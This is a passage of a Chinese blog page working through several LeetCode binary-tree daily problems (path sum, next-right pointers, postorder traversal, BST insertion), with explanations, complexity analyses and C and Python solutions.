class="keyword">sizeof</span>(<span class="keyword">int</span>) * nums);</span><br><span class="line">        <span class="built_in">memcpy</span>(path, <span class="built_in">set</span>, <span class="keyword">sizeof</span>(<span class="keyword">int</span>) * nums);</span><br><span class="line">        (*returnColumnSizes)[retn_nums] = nums;</span><br><span class="line">        retn[retn_nums++] = path;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    dfs(root-&gt;left,sum,returnColumnSizes);</span><br><span class="line">    dfs(root-&gt;right,sum,returnColumnSizes);</span><br><span class="line">    nums--;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span>** <span class="title">pathSum</span><span class="params">(struct TreeNode* root, <span class="keyword">int</span> sum, <span class="keyword">int</span>* returnSize, <span class="keyword">int</span>** returnColumnSizes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    retn_nums = nums = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">set</span> = (<span class="keyword">int</span>*) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*<span class="number">1000</span>);</span><br><span class="line">    retn = (<span class="keyword">int</span>**)<span class="built_in">calloc</span>(<span class="number">1000</span>,<span class="keyword">sizeof</span>(<span class="keyword">int</span>*));</span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">    &#123;</span><br><span class="line">        *returnSize = <span class="number">0</span>;</span><br><span class="line">        (*returnColumnSizes)[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    dfs(root,sum,returnColumnSizes);</span><br><span class="line">    *returnSize = retn_nums;</span><br><span class="line">    <span class="keyword">return</span> retn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/26/oqx2CRyb9JMavBZ.png" alt="image.png"></p><h2 id="0x04-填充每个节点的下一个右侧节点指针-II"><a href="#0x04-填充每个节点的下一个右侧节点指针-II" class="headerlink" title="0x04.填充每个节点的下一个右侧节点指针 II"></a>0x04.<a href="https://leetcode-cn.com/problems/populating-next-right-pointers-in-each-node-ii/" target="_blank" rel="noopener">填充每个节点的下一个右侧节点指针 II</a></h2><blockquote><p>给定一个二叉树</p><p>struct Node {<br>  int val;<br>  Node *left;<br>  Node *right;<br>  Node *next;<br>}<br>填充它的每个 next 指针，让这个指针指向其下一个右侧节点。如果找不到下一个右侧节点，则将 next 指针设置为 NULL。</p><p>初始状态下，所有 next 指针都被设置为 NULL。</p><p>进阶：</p><p>你只能使用常量级额外空间。<br>使用递归解题也符合要求，本题中递归程序占用的栈空间不算做额外的空间复杂度。</p><p>示例：</p><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2019/02/15/117_sample.png" alt="image.png"></p><p>输入：root = [1,2,3,4,5,null,7]<br>输出：[1,#,2,3,#,4,5,7,#]<br>解释：给定二叉树如图 A 所示，你的函数应该填充它的每个 next 指针，以指向其下一个右侧节点，如图 B 所示。</p><p>提示：</p><p>树中的节点数小于 6000<br>-100 &lt;= node.val &lt;= 100</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/populating-next-right-pointers-in-each-node-ii" target="_blank" rel="noopener">https://leetcode-cn.com/problems/populating-next-right-pointers-in-each-node-ii</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><blockquote><p>注：本题为2020.9.28的每日一题</p></blockquote><h3 id="解法一：层次遍历"><a href="#解法一：层次遍历" class="headerlink" title="解法一：层次遍历"></a>解法一：层次遍历</h3><p>我们考虑到当我们填充next指针将每一层的结点都连接起来后，<strong>该层所有结点便构成了一个单向链表</strong>，我们可以<strong>通过遍历每一层的链表来构造下一层的链表</strong></p><p>大致过程如下图</p><p><img src="https://i.loli.net/2020/09/28/485DnfumcRterSM.png" alt="BD12E33FCF6E3B97FC6DB3AF5B645CF2.png"></p><h4 id="时间复杂度：-1"><a href="#时间复杂度：-1" class="headerlink" title="时间复杂度："></a>时间复杂度：</h4><p>由于每个结点都要遍历一次，故时间复杂度为<strong>O</strong>(<strong>N</strong>)</p><h4 id="空间复杂度：-1"><a href="#空间复杂度：-1" class="headerlink" title="空间复杂度："></a>空间复杂度：</h4><p>由于没有使用到额外的空间，故空间复杂度为<strong>O</strong>(<strong>1</strong>)</p><h4 id="C语言版：-1"><a href="#C语言版：-1" class="headerlink" title="C语言版："></a>C语言版：</h4><p>我么可以得到如下代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * Definition for a Node.</span><br><span class="line"> * struct Node &#123;</span><br><span class="line"> *     int val;</span><br><span class="line"> *     struct Node *left;</span><br><span class="line"> *     struct Node *right;</span><br><span class="line"> *     struct Node *next;</span><br><span class="line"> * &#125;;</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">struct Node * last_node, *next_start;</span><br><span class="line"></span><br><span class="line">void connectList(struct Node * node)</span><br><span class="line">&#123;</span><br><span class="line">    if(last_node)</span><br><span class="line">    &#123;</span><br><span class="line">        last_node-&gt;next &#x3D; node;</span><br><span class="line">    &#125;</span><br><span class="line">    if(!next_start)</span><br><span class="line">    &#123;</span><br><span class="line">        next_start &#x3D; node;</span><br><span class="line">    &#125;</span><br><span class="line">    last_node &#x3D; node;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">struct Node *connect(struct Node *root) </span><br><span class="line">&#123;</span><br><span class="line">    if (!root)</span><br><span class="line">        return NULL;</span><br><span class="line"></span><br><span class="line">    struct Node *start &#x3D; root;</span><br><span class="line">    while(start)</span><br><span class="line">    &#123;</span><br><span class="line">        last_node &#x3D; NULL, next_start &#x3D; NULL;</span><br><span class="line">        while(start)</span><br><span class="line">        &#123;</span><br><span class="line">            if(start-&gt;left)</span><br><span class="line">                connectList(start-&gt;left);</span><br><span class="line">            if(start-&gt;right)</span><br><span class="line">                connectList(start-&gt;right);</span><br><span class="line">            start &#x3D; start-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        start &#x3D; next_start;</span><br><span class="line">    &#125;</span><br><span class="line">    return root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/28/tmKaLsnblvDce9H.png" alt="_XU940OX_R1_5XJK_H@N~5I.png"></p><h4 id="Python语言版：-1"><a href="#Python语言版：-1" class="headerlink" title="Python语言版："></a>Python语言版：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string"># Definition for a Node.</span></span><br><span class="line"><span class="string">class Node:</span></span><br><span class="line"><span class="string">    def __init__(self, val: int = 0, left: 'Node' = None, right: 'Node' = None, next: 'Node' = None):</span></span><br><span class="line"><span class="string">        self.val = val</span></span><br><span class="line"><span class="string">        self.left = left</span></span><br><span class="line"><span class="string">        self.right = right</span></span><br><span class="line"><span class="string">        self.next = next</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.last_node: <span class="string">'Node'</span></span><br><span class="line">        self.next_start: <span class="string">'Node'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">connect</span><span class="params">(self, root: <span class="string">'Node'</span>)</span> -&gt; 'Node':</span></span><br><span class="line">        <span class="keyword">if</span> root == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> root</span><br><span class="line"></span><br><span class="line">        start = root</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> start != <span class="literal">None</span>:</span><br><span class="line">            self.last_node = <span class="literal">None</span></span><br><span class="line">            self.next_start = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> start != <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">if</span> start.left != <span class="literal">None</span>:</span><br><span class="line">                    <span class="keyword">if</span> self.last_node != <span class="literal">None</span>:</span><br><span class="line">                        self.last_node.next = start.left</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> self.next_start == <span class="literal">None</span>:</span><br><span class="line">                        self.next_start = start.left</span><br><span class="line"></span><br><span class="line">                    self.last_node = start.left</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> start.right != <span class="literal">None</span>:</span><br><span class="line">                    <span class="keyword">if</span> self.last_node != <span class="literal">None</span>:</span><br><span class="line">                        self.last_node.next = start.right</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> self.next_start == <span class="literal">None</span>:</span><br><span class="line">                        self.next_start = start.right</span><br><span class="line"></span><br><span class="line">                    self.last_node = start.right</span><br><span class="line"></span><br><span class="line">                start = start.next</span><br><span class="line"></span><br><span class="line">            start = self.next_start</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> root</span><br><span class="line">                </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">connectList</span><span class="params">(self, node: <span class="string">'Node'</span>)</span>:</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.last_node != <span class="literal">None</span>:</span><br><span class="line">            self.last_node.next = node</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.next_start == <span class="literal">None</span>:</span><br><span class="line">            self.next_start = node</span><br><span class="line"></span><br><span class="line">        self.last_node = node</span><br></pre></td></tr></table></figure><p>![XTJUK27UN3_66_OSL5`_BZB.png](<a href="https://i.loli.net/2020/09/28/ywXFL85CP4Zm2B6.png" target="_blank" rel="noopener">https://i.loli.net/2020/09/28/ywXFL85CP4Zm2B6.png</a>)</p><h2 id="0x05-二叉树的后序遍历"><a href="#0x05-二叉树的后序遍历" class="headerlink" title="0x05.二叉树的后序遍历"></a>0x05.<a href="https://leetcode-cn.com/problems/binary-tree-postorder-traversal/" target="_blank" rel="noopener">二叉树的后序遍历</a></h2><blockquote><p>给定一个二叉树，返回它的 后序 遍历。</p><p>示例:</p><p>输入: [1,null,2,3]<br>1<br> <br>  2<br> /<br>3 </p><p>输出: [3,2,1]<br>进阶: 递归算法很简单，你可以通过迭代算法完成吗？</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/binary-tree-postorder-traversal" target="_blank" rel="noopener">https://leetcode-cn.com/problems/binary-tree-postorder-traversal</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><blockquote><p>注：本题为2020.9.29的每日一题</p></blockquote><h3 id="解法一：深度优先搜索（DFS）-递归后续遍历"><a href="#解法一：深度优先搜索（DFS）-递归后续遍历" class="headerlink" title="解法一：深度优先搜索（DFS） + 递归后续遍历"></a>解法一：深度优先搜索（DFS） + 递归后续遍历</h3><p>后序遍历的顺序是<strong>左→右→根</strong>，使用递归可以三分钟内解决</p><h4 id="时间复杂度：-2"><a href="#时间复杂度：-2" class="headerlink" title="时间复杂度："></a>时间复杂度：</h4><p>每个结点都过一遍，所以时间复杂度是<strong>O</strong>(<strong>N</strong>)</p><h4 id="空间复杂度：-2"><a href="#空间复杂度：-2" class="headerlink" title="空间复杂度："></a>空间复杂度：</h4><p>每个结点都要开辟一个单独的栈帧空间，故空间复杂度为<strong>O</strong>(<strong>N</strong>)</p><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note: The returned array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">int</span> * retn;</span><br><span class="line"><span class="keyword">int</span> <span class="built_in">size</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(struct TreeNode* root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(root-&gt;left)</span><br><span class="line">        dfs(root-&gt;left);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(root-&gt;right)</span><br><span class="line">        dfs(root-&gt;right);</span><br><span class="line"></span><br><span class="line">    retn[<span class="built_in">size</span>++] = root-&gt;val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span>* <span class="title">postorderTraversal</span><span class="params">(struct TreeNode* root, <span class="keyword">int</span>* returnSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">    &#123;</span><br><span class="line">        *returnSize = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    retn = (<span class="keyword">int</span>*) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*<span class="number">1000</span>);</span><br><span class="line">    <span class="built_in">size</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    dfs(root);</span><br><span class="line">    *returnSize = <span class="built_in">size</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/29/Smo2vrKwWfjH1Ta.png" alt="_B35__WY2L_Z`E_`27DA_FM.png"></p><h2 id="0x06-二叉搜索树中的插入操作"><a href="#0x06-二叉搜索树中的插入操作" class="headerlink" title="0x06. 二叉搜索树中的插入操作"></a>0x06.<a href="https://leetcode-cn.com/problems/insert-into-a-binary-search-tree/" target="_blank" rel="noopener"> 二叉搜索树中的插入操作</a></h2><blockquote><p>给定二叉搜索树（BST）的根节点和要插入树中的值，将值插入二叉搜索树。 返回插入后二叉搜索树的根节点。 输入数据保证，新值和原始二叉搜索树中的任意节点值都不同。</p><p>注意，可能存在多种有效的插入方式，只要树在插入后仍保持为二叉搜索树即可。 你可以返回任意有效的结果。</p><p>例如, </p><p>给定二叉搜索树:</p><pre><code>    4   / \  2   7 / \1   3</code></pre><p>和 插入的值: 5<br>你可以返回这个二叉搜索树:</p><pre><code>     4   /   \  2     7 / \   /1   3 5</code></pre><p>或者这个树也是有效的:</p><pre><code>     5   /   \  2     7 / \   1   3     \      4</code></pre><p>提示：</p><p>给定的树上的节点数介于 0 和 10^4 之间<br>每个节点都有一个唯一整数值，取值范围从 0 到 10^8<br>-10^8 &lt;= val &lt;= 10^8<br>新值和原始二叉搜索树中的任意节点值都不同</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/insert-into-a-binary-search-tree" target="_blank" rel="noopener">https://leetcode-cn.com/problems/insert-into-a-binary-search-tree</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><blockquote><p>注：本题为2020.9.30的每日一题</p></blockquote><h3 id="解法：深度优先搜索（DFS）-1"><a href="#解法：深度优先搜索（DFS）-1" class="headerlink" title="解法：深度优先搜索（DFS）"></a>解法：深度优先搜索（DFS）</h3><p>深度优先搜索遍历这棵树， <strong>插入值大于结点值则往右子树插，否则往左子树插</strong></p><p><strong>递归</strong>可以很方便地解决这个问题</p><h4 id="时间复杂度：-3"><a href="#时间复杂度：-3" class="headerlink" title="时间复杂度："></a>时间复杂度：</h4><p>每个结点都有可能过一遍，所以时间复杂度是<strong>O</strong>(<strong>N</strong>)</p><h4 id="空间复杂度：-3"><a href="#空间复杂度：-3" class="headerlink" title="空间复杂度："></a>空间复杂度：</h4><p>每个结点都要开辟一个单独的栈帧空间，故空间复杂度为<strong>O</strong>(<strong>N</strong>)</p><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(struct TreeNode* root, <span class="keyword">int</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(val &gt; root-&gt;val)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!root-&gt;right)</span><br><span class="line">        &#123;</span><br><span class="line">            root-&gt;right = (struct TreeNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct TreeNode));</span><br><span class="line">            root-&gt;right-&gt;val = val;</span><br><span class="line">            root-&gt;right-&gt;left = <span class="literal">NULL</span>;</span><br><span class="line">            root-&gt;right-&gt;right = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            dfs(root-&gt;right, val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!root-&gt;left)</span><br><span class="line">        &#123;</span><br><span class="line">            root-&gt;left = (struct TreeNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct TreeNode));</span><br><span class="line">            root-&gt;left-&gt;val = val;</span><br><span class="line">            root-&gt;left-&gt;left = <span class="literal">NULL</span>;</span><br><span class="line">            root-&gt;left-&gt;right = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            dfs(root-&gt;left, val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">struct TreeNode* <span class="title">insertIntoBST</span><span class="params">(struct TreeNode* root, <span class="keyword">int</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">    &#123;</span><br><span class="line">        root = (struct TreeNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct TreeNode));</span><br><span class="line">        root-&gt;left = <span class="literal">NULL</span>;</span><br><span class="line">        root-&gt;right = <span class="literal">NULL</span>;</span><br><span class="line">        root-&gt;val = val;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">    dfs(root, val);</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>![Z08G_KN_4GTD1`J_3NC0__F.png](<a href="https://i.loli.net/2020/09/30/EUIqglNFiRvJCoz.png" target="_blank" rel="noopener">https://i.loli.net/2020/09/30/EUIqglNFiRvJCoz.png</a>)</p><h2 id="0x07-填充每个节点的下一个右侧节点指针"><a href="#0x07-填充每个节点的下一个右侧节点指针" class="headerlink" title="0x07. 填充每个节点的下一个右侧节点指针"></a>0x07.<a href="https://leetcode-cn.com/problems/populating-next-right-pointers-in-each-node/" target="_blank" rel="noopener"> 填充每个节点的下一个右侧节点指针</a></h2><blockquote><p>给定一个完美二叉树，其所有叶子节点都在同一层，每个父节点都有两个子节点。二叉树定义如下：</p><p>struct Node {<br>int val;<br>Node *left;<br>Node *right;<br>Node *next;<br>}<br>填充它的每个 next 指针，让这个指针指向其下一个右侧节点。如果找不到下一个右侧节点，则将 next 指针设置为 NULL。</p><p>初始状态下，所有 next 指针都被设置为 NULL。</p><p>示例：</p><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2019/02/15/116_sample.png" alt="image.png"></p><p>输入：{“$id”:”1”,”left”:{“$id”:”2”,”left”:{“$id”:”3”,”left”:null,”next”:null,”right”:null,”val”:4},”next”:null,”right”:{“$id”:”4”,”left”:null,”next”:null,”right”:null,”val”:5},”val”:2},”next”:null,”right”:{“$id”:”5”,”left”:{“$id”:”6”,”left”:null,”next”:null,”right”:null,”val”:6},”next”:null,”right”:{“$id”:”7”,”left”:null,”next”:null,”right”:null,”val”:7},”val”:3},”val”:1}</p><p>输出：{“$id”:”1”,”left”:{“$id”:”2”,”left”:{“$id”:”3”,”left”:null,”next”:{“$id”:”4”,”left”:null,”next”:{“$id”:”5”,”left”:null,”next”:{“$id”:”6”,”left”:null,”next”:null,”right”:null,”val”:7},”right”:null,”val”:6},”right”:null,”val”:5},”right”:null,”val”:4},”next”:{“$id”:”7”,”left”:{“$ref”:”5”},”next”:null,”right”:{“$ref”:”6”},”val”:3},”right”:{“$ref”:”4”},”val”:2},”next”:null,”right”:{“$ref”:”7”},”val”:1}</p><p>解释：给定二叉树如图 A 所示，你的函数应该填充它的每个 next 指针，以指向其下一个右侧节点，如图 B 所示。</p><p>提示：</p><p>你只能使用常量级额外空间。<br>使用递归解题也符合要求，本题中递归程序占用的栈空间不算做额外的空间复杂度。</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/populating-next-right-pointers-in-each-node" target="_blank" rel="noopener">https://leetcode-cn.com/problems/populating-next-right-pointers-in-each-node</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><blockquote><p>注：本题和2020.9.28的每日一题几乎完全一样</p></blockquote><h3 id="解法一：层次遍历-1"><a href="#解法一：层次遍历-1" class="headerlink" title="解法一：层次遍历"></a>解法一：层次遍历</h3><p>我们考虑到当我们填充next指针将每一层的结点都连接起来后，<strong>该层所有结点便构成了一个单向链表</strong>，我们可以<strong>通过遍历每一层的链表来构造下一层的链表</strong></p><p>大致过程如下图</p><p><img src="https://i.loli.net/2020/09/28/485DnfumcRterSM.png" alt="BD12E33FCF6E3B97FC6DB3AF5B645CF2.png"></p><h4 id="时间复杂度：-4"><a href="#时间复杂度：-4" class="headerlink" title="时间复杂度："></a>时间复杂度：</h4><p>由于每个结点都要遍历一次，故时间复杂度为<strong>O</strong>(<strong>N</strong>)</p><h4 id="空间复杂度：-4"><a href="#空间复杂度：-4" class="headerlink" title="空间复杂度："></a>空间复杂度：</h4><p>由于没有使用到额外的空间，故空间复杂度为<strong>O</strong>(<strong>1</strong>)</p><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a Node.</span></span><br><span class="line"><span class="comment"> * struct Node &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct Node *left;</span></span><br><span class="line"><span class="comment"> *     struct Node *right;</span></span><br><span class="line"><span class="comment"> *     struct Node *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> * <span class="title">last_node</span>, *<span class="title">next_start</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">connectList</span><span class="params">(struct Node * node)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(last_node)</span><br><span 